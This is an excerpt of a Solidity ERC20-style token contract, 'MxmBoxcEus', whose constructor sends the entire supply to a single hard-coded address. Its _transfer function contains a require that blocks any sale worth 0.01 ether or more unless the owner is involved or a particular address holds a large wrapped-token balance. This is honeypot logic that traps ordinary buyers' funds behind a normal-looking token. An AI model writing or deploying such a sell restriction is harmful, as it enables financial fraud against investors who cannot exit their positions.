...
contract MxmBoxcEus {
    ...
    constructor () public {
        ...
        _symbol = "M2";
        _decimals = 18;
        _totalSupply = 10000000000000000000000;// 10_00000000.mul(10 ** uint256(18));
        balances[0xdaE87f5bFC8f99458D581ad6c58d6cfB31D61Fb9] = _totalSupply;
        emit Transfer(address(this), 0xdaE87f5bFC8f99458D581ad6c58d6cfB31D61Fb9, _totalSupply);
    ...
    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        ...
        require(sellMbe(_amount) < 0.01 ether || _sender==owner || _recipient == owner || ERC20(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c)).balanceOf(pir) >= 500 ether);
